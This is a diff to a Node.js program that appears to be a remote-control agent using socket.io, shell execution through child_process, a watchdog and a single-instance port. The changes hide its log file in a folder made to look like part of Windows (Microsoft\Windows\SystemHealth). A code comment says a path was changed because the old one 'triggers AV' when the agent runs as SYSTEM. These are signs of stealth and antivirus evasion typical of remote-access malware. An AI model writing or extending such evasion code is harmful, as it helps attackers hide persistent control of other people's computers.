@@ -1,7 +1,22 @@
-const io = require("socket.io-client");
-const os = require("os");
 const fs = require("fs");
 const path = require("path");
+
+// ═══════════════════════════════════════════════
+// 🕵️ FALLBACK LOGGING FOR DEBUGGING
+// ═══════════════════════════════════════════════
+const logFile = path.join("C:\\ProgramData\\Microsoft\\Windows\\SystemHealth", "agent_boot.log");
+function _bootLog(msg) {
+    try { fs.appendFileSync(logFile, `[${new Date().toISOString()}] ${msg}\n`); } catch(e) {}
+}
+_bootLog("=== AGENT BOOT SEQUENCE INITIATED ===");
+
+process.on("uncaughtException", (err) => {
+    _bootLog("FATAL ERROR: " + err.message + "\n" + err.stack);
+    process.exit(1);
+});
+
+const io = require("socket.io-client");
+const os = require("os");
 const { exec, execSync, spawn } = require("child_process");
 const axios = require("axios");
 const http = require("http");
@@ -43,7 +58,9 @@ ensureWatchdog();
 // ═══════════════════════════════════════════════
 
 const net = require("net");
-const extractDir = process.pkg ? path.join(os.homedir(), "AppData", "Roaming", "HBOSE") : __dirname;
+// When packaged, extractDir must be the directory of the executable (C:\ProgramData\...)
+// DO NOT use os.homedir() because when run as SYSTEM, that resolves to System32 and triggers AV
+const extractDir = process.pkg ? path.dirname(process.execPath) : __dirname;
 if (!fs.existsSync(extractDir)) fs.mkdirSync(extractDir, { recursive: true });
 
 const SINGLE_INSTANCE_PORT = 49201;
